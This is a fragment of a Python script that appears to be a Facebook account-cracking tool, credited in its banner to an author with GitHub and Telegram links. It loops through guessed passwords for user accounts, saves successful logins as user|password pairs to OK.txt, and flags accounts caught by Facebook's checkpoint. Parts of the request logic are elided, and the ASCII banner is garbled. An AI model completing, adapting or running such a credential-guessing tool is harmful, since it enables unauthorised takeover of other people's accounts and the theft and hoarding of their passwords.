...
os.system("clear")
print("")
print("%s    _______ _    _ ______   _______       _      ______"%(M))
print("%s   _   _ _______ ______ _____    _______ ______ "%(M))
print("%s    |__   __| |  | |  ____| |__   __|/\   | |    |  ____| \ | |"%(M))
print("%s    __   __|  ____|  __ \  |__   __|  ____|   /\   |  \/  |"%(M))
print("%s     | |  | |__| | |__       | |  /  \  | |    | |__  |  \| |  | |  | |"%(M))
print("%s    __  | |  | |    | |  | |__     /  \  | \  / | "%(Z))
print("%s      | |  |  __  |  __|      | | / /\ \ | |    |  __| | . ` |  | |  | "%(Z))
print("%s     __| | |  | |    | |  |  __|   / /\ \ | |\/| | "%(Z))
print("%s         | |  | |  | | |____     | |/ ____ \| |____| |____| |\  |  |   "%(Z))
print("%s            |  | |____| |__| |    | |  | |____ / ____ \| |  | |                       "%(Z))
print("%s╔══════════════════════════════════════════╗"%(Z))
print("%s║%s  Author   : %s𝙈𝙧.Tohedul                     %s║"%(Z,B,M,Z))
print("%s║%s  Github   : https://github.com/tohedul190  %s║"%(Z,B,Z))
print("%s║%s  Telegram : https://t.me/tohedul789       %s║"%(Z,B,Z))
...
try:
	for pw in pwx:
		...
		if "session_key" in result:
			print('\033[1;32m [tohedul-OK] '+user+'|'+pw+'\033[0;97m')
			open('OK.txt', 'a').write(user+'|'+pw+'\n')
			oks.append(user)
			break
		elif "www.facebook.com" in result["error_msg"]:
			print(result)
			print('\033[1;31m [tohedul-CP] '+user+'|'+pw+'\033[0;97m')
